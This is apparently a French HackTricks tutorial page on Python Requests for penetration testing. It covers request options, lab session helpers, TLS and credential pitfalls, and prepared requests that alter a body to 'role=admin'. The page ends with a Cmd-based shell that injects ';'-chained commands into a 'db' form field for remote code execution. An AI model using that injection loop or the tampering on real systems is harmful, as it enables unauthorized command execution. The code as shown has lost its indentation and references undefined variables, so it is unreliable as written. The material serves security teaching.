# Requêtes Web

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Ces exemples utilisent les arguments de requête documentés de Requests, les propriétés de réponse, les tuples de fichiers multipart et les sessions.<sup>[[1]](#references)</sup> Les exemples `verify=False` désactivent la vérification des certificats TLS et doivent être limités à des tests contrôlés.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Requêtes préparées pour contrôler la charge utile

Un `PreparedRequest` expose l’URL finale, les en-têtes et le corps encodé avant son envoi. Construisez-le avec `Session.prepare_request()` (plutôt qu’avec `Request.prepare()`) lorsque les cookies de session ou l’authentification doivent être appliqués ; lorsque le flux préparé doit également respecter les paramètres de proxy/CA de l’environnement, fusionnez-les explicitement avec `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
C'est utile lorsqu'un exploit nécessite un encodage non standard ou lors de la comparaison du payload construit avec la requête stockée dans `response.request`. Il ne s'agit pas d'une primitive raw-HTTP : Requests stocke les headers dans un mapping insensible à la casse ; l'affectation d'un nom en double remplace donc la valeur précédente. Utilisez un sender de niveau inférieur pour les lignes de requête malformées ou les champs `Content-Length`/`Transfer-Encoding` dupliqués distincts nécessaires aux [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Isolation des sessions, credentials implicites et état TLS

Une session fait confiance par défaut à la configuration de l'environnement. Si aucune authentification explicite n'est fournie, Requests peut récupérer des credentials Basic depuis `.netrc` ; il peut également importer la configuration du proxy et les chemins des bundles CA depuis les variables d'environnement. Pour les scripts qui récupèrent des URLs contrôlées par un attaquant, désactivez ces entrées implicites et configurez explicitement uniquement le proxy/CA de lab prévu. Les versions antérieures à 2.32.4 pouvaient sélectionner les credentials `.netrc` du mauvais host lorsqu'une URL conçue de manière malveillante leur était fournie ; `Session.trust_env = False` constitue le workaround documenté lorsqu'une mise à niveau est impossible.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Conservez une session qui utilise `verify=False` séparée des sessions qui exigent un TLS vérifié. Dans Requests avant la version 2.32.0, une connexion ouverte initialement avec `verify=False` pouvait être réutilisée pour des requêtes ultérieures vers la même origine, même lorsque ces requêtes spécifiaient `verify=True` ; la mise à niveau corrige ce problème d'état du pool, mais l'isolation facilite également l'audit des scripts d'exploit.<sup>[[5]](#references)</sup>

## Boucles d'exploit fiables

Requests n'a pas de timeout par défaut. Un timeout `(connect, read)` ne constitue pas une échéance totale en temps réel : le composant `read` limite la durée pendant laquelle le client attend entre deux octets reçus. Désactivez les redirections automatiques lorsqu'une cible contrôle `Location`, puis validez chaque saut avant d'envoyer une nouvelle requête ; si les redirections sont activées, inspectez `response.history`. Pour les réponses volumineuses ou hostiles, utilisez `stream=True`, itérez par blocs de taille limitée et fermez la réponse avec un gestionnaire de contexte afin que la connexion du pool soit libérée.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Commande Python pour exploiter une RCE

La boucle de commandes dérive de `Cmd` de Python ; sa méthode `default` gère les préfixes de commandes non reconnus, `cmdloop` distribue les lignes d’entrée, et `re.DOTALL` permet au motif d’extraction de s’étendre sur plusieurs lignes.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Interface développeur de Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Prise en charge des interpréteurs de commandes orientés ligne](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Opérations sur les expressions régulières](https://docs.python.org/3/library/re.html)
- [4] [Requests vulnérable à une fuite de credentials `.netrc` via des URL malveillantes](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [L’objet `Session` de Requests ne vérifie pas les requêtes après la première requête effectuée avec `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
